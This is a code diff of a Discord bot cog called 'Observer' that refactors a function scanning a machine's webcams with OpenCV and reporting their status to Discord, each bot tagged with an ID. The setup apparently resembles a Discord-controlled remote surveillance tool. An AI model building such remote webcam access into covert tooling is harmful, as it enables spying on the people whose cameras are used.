@@ -105,6 +105,7 @@ class Observer(commands.Cog):
         await self.process_webcam(ctx, webcam_num)
 
     # TODO: Fix Camera index out Issue
+    # I can't resolve the camera index out issue.
     @commands.command(name="camlist", aliases=["cams"])
     async def list_webcams(self, ctx, arg1: str = None, num: int = 1):    
         my_id = getattr(self.bot, 'port_id', 'Unknown')  
@@ -133,35 +134,8 @@ class Observer(commands.Cog):
         
         async with ctx.typing():
             try:
-                def scan_cameras_dynamic():
-                    report = []
-                    found_count = 0
-                    for idx in range(scan_num): 
-                        cap = cv2.VideoCapture(idx, cv2.CAP_ANY)
-                        if cap.isOpened():
-                            ret, frame = cap.read()
-
-                            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
-                            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
-                                
-                            status = ""
-                            if ret and np.sum(frame) > 0:
-                                status = "**Active**"
-                            elif ret and np.sum(frame) == 0:
-                                status = "**Black**"
-                            else:
-                                status = "**Error**"
-
-                            report.append(f"**{idx+1}**. {status} `({width}x{height})`")
-                            found_count += 1
-                            cap.release() 
-                    if not report:
-                        return "No cameras detected.", 0
-                    
-                    return "\n".join(report), found_count
-
                 loop = asyncio.get_running_loop()
-                result_text, count = await loop.run_in_executor(None, scan_cameras_dynamic)
+                result_text, count = await loop.run_in_executor(None, self.scan_cameras_dynamic, scan_num)
                 
                 embed = discord.Embed(
                     title=f"Connected Webcams - [{my_id}]",
@@ -172,6 +146,34 @@ class Observer(commands.Cog):
 
             except Exception as e:
                 await ctx.send(f"**[{my_id}]** Error: {e}")
+
+    def scan_cameras_dynamic(self, scan_num: int):
+        report = []
+        found_count = 0
+        for idx in range(scan_num): 
+            cap = cv2.VideoCapture(idx, cv2.CAP_ANY)
+            if cap.isOpened():
+                ret, frame = cap.read()
+
+                width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                                
+                status = ""
+                if ret and np.sum(frame) > 0:
+                                status = "**Active**"
+                elif ret and np.sum(frame) == 0:
+                    status = "**Black**"
+                else:
+                    status = "**Error**"
+
+                report.append(f"**{idx+1}**. {status} `({width}x{height})`")
+                found_count += 1
+                cap.release() 
+        if not report:
+            return "No cameras detected.", 0
+        
+        return "\n".join(report), found_count
+
 
     async def process_webcam(self, ctx, num: int):
         my_id = getattr(self.bot, 'port_id', 'Unknown')
